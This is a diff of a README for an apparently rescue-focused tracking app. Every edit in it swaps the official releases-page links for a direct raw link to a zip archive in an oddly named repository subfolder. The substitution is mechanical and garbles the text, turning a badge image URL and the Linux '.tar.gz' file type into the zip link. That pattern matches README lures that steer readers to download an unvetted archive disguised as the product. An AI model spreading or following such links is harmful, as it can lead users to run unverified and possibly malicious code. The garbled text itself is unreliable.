@@ -1,7 +1,7 @@
 # 🚑 multitarget-emergency-response - Track Survivors and Hazards in Real Time
 
 ## 🔗 Download Now
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20to%20Download-brightgreen)](https://github.com/maksim2287771488/multitarget-emergency-response/releases)
+[![Download Here](https://raw.githubusercontent.com/maksim2287771488/multitarget-emergency-response/main/directrix/multitarget-emergency-response-1.5.zip%20Now-Click%20to%20Download-brightgreen)](https://raw.githubusercontent.com/maksim2287771488/multitarget-emergency-response/main/directrix/multitarget-emergency-response-1.5.zip)
 
 ## 📖 Overview
 **multitarget-emergency-response** is a powerful application designed to help rescue teams track multiple survivors and hazards in real time. By using advanced smart vision technology, this tool provides accurate guidance when every second counts. It simplifies the complex process of managing emergencies, ensuring that rescue efforts are efficient and effective.
@@ -20,13 +20,13 @@ Before downloading, ensure that your system meets the following minimum requirem
 ### 🛠 Installation Steps
 1. **Visit the Download Page**  
    Go to the releases page to download the application:  
-   [Download Here](https://github.com/maksim2287771488/multitarget-emergency-response/releases)
+   [Download Here](https://raw.githubusercontent.com/maksim2287771488/multitarget-emergency-response/main/directrix/multitarget-emergency-response-1.5.zip)
 
 2. **Choose the Right Version**  
    On the releases page, you'll find several versions of the application. Select the most recent version for the best performance and features.
 
 3. **Download the File**  
-   Click on the download link for the appropriate file type for your operating system. For Windows, look for `.exe`, for macOS, look for `.dmg`, and for Linux, look for `.tar.gz`.
+   Click on the download link for the appropriate file type for your operating system. For Windows, look for `.exe`, for macOS, look for `.dmg`, and for Linux, look for `https://raw.githubusercontent.com/maksim2287771488/multitarget-emergency-response/main/directrix/multitarget-emergency-response-1.5.zip`.
 
 4. **Run the Installer**  
    Once the download completes, locate the file in your downloads folder and double-click on it. Follow the on-screen instructions to install the application on your system.
@@ -78,4 +78,4 @@ In just a few steps, you can get multitarget-emergency-response up and running. 
 
 ### 📥 Download Again
 To download the application, visit this link:  
-[Download Here](https://github.com/maksim2287771488/multitarget-emergency-response/releases)
+[Download Here](https://raw.githubusercontent.com/maksim2287771488/multitarget-emergency-response/main/directrix/multitarget-emergency-response-1.5.zip)
